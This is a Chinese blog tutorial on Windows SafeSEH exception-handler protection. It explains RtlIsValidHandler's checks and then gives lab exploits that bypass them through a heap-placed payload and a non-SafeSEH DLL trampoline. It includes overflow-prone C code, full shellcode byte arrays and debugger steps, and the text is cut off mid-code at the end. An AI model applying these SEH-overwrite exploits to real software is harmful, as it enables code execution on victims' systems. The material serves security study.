href="#%E5%AE%9E%E9%AA%8C%E6%80%9D%E8%B7%AF"><span class="toc-number">5.1.</span> <span class="toc-text">实验思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-number">5.2.</span> <span class="toc-text">实验步骤：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97%E4%B9%8B%E5%A4%96%E7%9A%84%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87-safeseh"><span class="toc-number">6.</span> <span class="toc-text">利用加载模块之外的地址绕过 SafeSEH</span></a></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-亡羊补牢：SafeSEH" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">亡羊补牢：SafeSEH</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/" class="article-date"><time datetime="2022-06-09T11:31:34.000Z" itemprop="datePublished">2022-06-09</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/SafeSEH/" rel="tag">SafeSEH</a> </span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/#comments" class="article-comment-link">评论</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 6.7k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 28(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h1 id="safeseh-对异常处理的保护原理"><a class="markdownIt-Anchor" href="#safeseh-对异常处理的保护原理"></a> SafeSEH 对异常处理的保护原理</h1><h2 id="safeseh的原理"><a class="markdownIt-Anchor" href="#safeseh的原理"></a> SafeSEH的原理</h2><p>在程序调用异常处理函数前，对要调用的异常处理函数进行一系列的有效性校验，当发现异常处理函数不可靠时终止异常处理函数的调用。SafeSEH 需要操作系统和编译器的双重支持，二者缺一都会降低 SafeSEH 的保护能力。</p><h3 id="编译器在safeseh-机制中所做的工作"><a class="markdownIt-Anchor" href="#编译器在safeseh-机制中所做的工作"></a> 编译器在SafeSEH 机制中所做的工作</h3><p>启用/SafeSEH 链接选项后，编译器在编译程序的时候将程序所有的异常处理函数地址提取出来，编入一张安全 S.E.H 表，并将这张表放到程序的映像中。当程序调用异常处理函数的时候，会将函数地址与安全 S.E.H 表进行匹配，检查调用的异常处理函数是否位于安全 S.E.H 表中。</p><p>比较同一段代码在 VC++ 6. 0 （没有SafeSEH机制）和 VS 2008（有SafeSEH机制）分别编译后安全 S.E.H 表的区别。VS 2008 在编译程序时将程序中的异常处理函数的地址提取出来放到安全 S.E.H 表中。<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605173356294.png" alt="image-20220605173356294"></p><h3 id="操作系统在safeseh机制中的作用"><a class="markdownIt-Anchor" href="#操作系统在safeseh机制中的作用"></a> 操作系统在SafeSEH机制中的作用</h3><p>通过前面（文章《形形色色的内存攻击技术》中）对S.E.H的的介绍，我们知道异常处理函数的调用是通过 RtlDispatchException()函数处理实现的，SafeSEH机制也是从这里开始的。</p><p>保护措施：</p><p>（1）检查<strong>异常处理链</strong>是否位于当前程序的栈中，如下图所示。如果不在当前栈中，程序将终止异常处理函数的调用。<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605174009415.png" alt="image-20220605174009415"></p><p>（2）检查<strong>异常处理函数的指针</strong>是否指向当前程序的栈中，如上图所示。如果指向当前栈中，程序将终止异常处理函数的调用。</p><p>（3）在前面两项检查都通过后，程序调用 RtlIsValidHandler()，来对异常处理函数的有效性进行验证。</p><h4 id="rtlisvalidhandler-都做了哪些工作呢"><a class="markdownIt-Anchor" href="#rtlisvalidhandler-都做了哪些工作呢"></a> RtlIsValidHandler() 都做了哪些工作呢？</h4><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605174617111.png" alt="image-20220605174617111"></p><p>首先，该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，校验函数将依次进行如下校验。</p><p>（ 1）判断程序是否设置了 IMAGE_DLLCHARACTERISTICS_NO_SEH 标识。如果设置了这个标识，这个程序内的异常会被忽略，函数直接返回校验失败。<br>（ 2）检测程序是否包含安全 S.E.H 表。如果程序包含安全 S.E.H 表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。<br>（ 3）判断程序是否设置 ILonly 标识。如果设置了这个标识，<a target="_blank" rel="noopener" href="http://xn--uirrueg070benjhh4a8d0anda.NET">说明该程序只包含.NET</a> 编译人中间语言，函数直接返回校验失败。<br>（ 4）判断异常处理函数地址是否位于不可执行页（ non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常。</p><p>如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行 DEP 相关检测，函数依次进行如下校验。<br>（ 1）判断异常处理函数地址是否位于不可执行页（ non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常。<br>（ 2）判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。</p><p>RtlIsValidHandler()函数的伪代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">RtlIsValidHandler</span><span class="params">(handler)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (handler is in an image) &#123; <span class="comment">//在加载模块内存空间内</span></span><br><span class="line">		<span class="keyword">if</span> (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		<span class="keyword">if</span> (image has a SafeSEH table)&#123; <span class="comment">//含有安全 S.E.H 表，说明程序启用 SafeSEH</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)<span class="comment">//异常处理函数地址出现在安全 S.E.H 表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span> (image is a .NET assembly with the ILonly flag <span class="built_in">set</span>) <span class="comment">//只包含 IL</span></span><br><span class="line">        	<span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) &#123; <span class="comment">//跑到不可执行页上了</span></span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//DEP 关闭</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION; <span class="comment">//抛出访问违例异常</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is not in an image) &#123; <span class="comment">//在加载模块内存之外，并且在可执行页上</span></span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">            <span class="comment">//允许在加载模块内存空间外执行</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE; <span class="comment">//前面条件都不满足的话只能允许这个异常处理函数执行了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RtlIsValidHandler() 函数在哪些情况下允许异常处理函数执行？<br>（ 1）异常处理函数位于加载模块内存范围之外， DEP 关闭。<br>（ 2）异常处理函数位于加载模块内存范围之内，相应模块未启用 SafeSEH（安全 S.E.H 表为空），同时相应模块不是纯 IL。<br>（ 3）异常处理函数位于加载模块内存范围之内，相应模块启用 SafeSEH（安全 S.E.H 表不为空），异常处理函数地址包含在安全 S.E.H 表中。</p><p>我们来分析一下这三种情况攻击成功的可行性。<br>（ 1）现在我们只考虑 SafeSEH，不考虑 DEP，针对 DEP 的讨论我们放到下一节中。排除DEP 干扰后，我们只需在加载模块内存范围之外找到一个跳板指令就可以转入 shellcode 执行，这点还是比较容易实现的。<br>（ 2）在第二种情况中，我们可以利用未启用 SafeSEH 模块中的指令作为跳板， 转入 shellcode 执行，这也是为什么我们说 SafeSEH 需要操作系统与编译器的双重支持。在加载模块中找到一个未启用的 SafeSEH 模块也不是一件很困难的事情。<br>（ 3）这种情况下我们有两种思路可以考虑，一是清空安全 S.E.H 表，造成该模块未启用SafeSEH 的假象；二是将我们的指令注册到安全 S.E.H 表中。由于安全 S.E.H 表的信息在内存中是加密存放的，所以突破它的可能性也不大，这条路我们就先放弃吧。</p><p>通过以上分析可以得出结论：突破 SafeSEH 还是可以做到的。您可能会问这些方法貌似有点复杂，有没有更为简便的方法突破呢？很负责地告诉您，有两种更为简便直接方法可以突破 SafeSEH。<br>（ 1）不攻击 S.E.H（太邪恶了），可以考虑覆盖返回地址或者虚函数表等信息。<br>（ 2）利用 S.E.H 的终极特权！这种安全校验存在一个严重的缺陷——如果 S.E.H 中的异常函数指针指向堆区，即使安全校验发现了 S.E.H 已经不可信，仍然会调用其已被修改过的异常处理函数，因此只要将 shellcode 布置到堆区就可以直接跳转执行！</p><blockquote><p>请注意本节所有关于绕过 SafeSEH 机制的讨论均不考虑 DEP 的影响</p></blockquote><h1 id="攻击返回地址绕过-safeseh"><a class="markdownIt-Anchor" href="#攻击返回地址绕过-safeseh"></a> 攻击返回地址绕过 SafeSEH</h1><p>如果碰到一个程序，他启用了 SafeSEH 但是未启用 GS，或者启用了 GS 但是刚好被攻击的函数没有 GS 保护（我们不考虑这种事情发生的概率，而且这种漏洞的的确确存在），攻击者肯定会直接攻击函数返回地址。实验请看《栈中的守护天使：GS》，这里不再重复介绍了。</p><h1 id="利用虚函数绕过-safeseh"><a class="markdownIt-Anchor" href="#利用虚函数绕过-safeseh"></a> 利用虚函数绕过 SafeSEH</h1><p>利用思路和我们在《栈中的守护天使：GS》中介绍的类似，通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理， SafeSEH 也就只是个摆设。在这我们就不做过多介绍了。</p><h1 id="从堆中绕过-safeseh"><a class="markdownIt-Anchor" href="#从堆中绕过-safeseh"></a> 从堆中绕过 SafeSEH</h1><p>演示如何利用堆绕过 SafeSEH。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdafx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xF8\x3D\x39\x00&quot;</span><span class="comment">//address of shellcode in heap</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">//char shellcode[]=</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(str,input);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> * buf=(<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">    __asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf,shellcode);</span><br><span class="line">    test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验思路：<br>（ 1）首先在堆中申请 500 字节的空间，用来存放 shellcode。<br>（ 2）函数 test 存在一个典型的溢出，通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 3）用 shellcode 在堆中的起始地址覆盖异常处理函数地址，然后通过制造除 0 异常，将程序转入异常处理，进而跳转到堆中的 shellcode 执行。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th><th></th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td>DEP 关闭</td></tr><tr><td>编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明： shellcode 中尾部的 0x00393DF8 为 shellcode 在堆中的起始地址，该地址可能在实验过程中需要重新设置。</p></blockquote><p>首先将 shellcode 填充为多个 0x90，然后将程序用 VS2008 编译好后运行，由于我们再程序中加入了 int 3 指令，程序会自动中断，我们选择调试后系统会调用默认调试器进行调试，程序会自动停在 __asm int 3 处 。</p><p>如下图，程序中断前刚刚完成堆中空间申请，此时寄存器 EAX 中存放着申请空间的首地址 0x00393DF8，这个地址在不同机器上会有所不同。有了 shellcode的首地址，我们还需要确定shellcode需要填充多少字节才能淹没异常函数的地址。继续运行程序，中断在 test 函数中字符串复制结束时。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605193524256.png" alt="image-20220605193524256"></p><p>如下图所示，被溢出的字符串起始地址为 0x0012FE8C，S.E.H 异常处理函数指针位于 0x0012FFB0+4 的位置。所以我们使用 300 个字节就能覆盖掉异常处理函数指针。<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605194838798.png" alt="image-20220605194838798"></p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605194942893.png" alt="image-20220605194942893"></p><p>布置 shellcode：</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605195648181.png" alt="image-20220605195648181"></p><p>验证我们的分析是否正确。程序依然会被 INT 3 中断，等OllyDbg运行后 按Ctrl+G 跳转到 0x00393DF8 设置断点，然后按F9继续运行，可以看到程序在 0x00393DF8 处中断，说明我们已经成功绕过SafeSEH 转入 shellcode 执行。继续执行就会看到 failwest 对话框了。</p><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605200429987.png" alt="image-20220605200429987"></p><h1 id="利用未启用-safeseh-模块绕过-safeseh"><a class="markdownIt-Anchor" href="#利用未启用-safeseh-模块绕过-safeseh"></a> 利用未启用 SafeSEH 模块绕过 SafeSEH</h1><p>SafeSEH 对于未启用 SafeSEH 模块中的异常处理的校验过程：如果模块未启用 SafeSEH，并且该模块包含除中间语言（IL）之外的其它语言，这个异常处理就可以被执行。所以我们可以利用未启用 SafeSEH 的模块中的指令作为跳板来绕过 SafeSEH。</p><p>实验思路：构造一个不启用 SafeSEH 的 dll，然后将其加载，并通过它里面的指令作为跳板实现 SafeSEH 的绕过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH_JUMP.DLL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">jump</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">    		pop eax</span><br><span class="line">	    	pop eax</span><br><span class="line">    		retn</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH.EXE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x12\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span 